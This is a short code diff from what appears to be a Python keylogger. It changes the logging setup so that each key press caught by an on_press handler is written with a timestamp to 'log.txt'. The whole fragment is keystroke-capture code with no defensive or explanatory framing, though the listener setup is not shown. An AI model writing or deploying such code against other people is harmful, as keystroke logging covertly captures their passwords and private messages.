@@ -8,9 +8,7 @@ except ImportError:
 
 import logging
 
-log_dir = "";
-
-logging.basicConfig(filename=(log_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s');
+logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%d-%b-%y %H:%M:%S');
 
 def on_press(key):
 	logging.info(str(key));
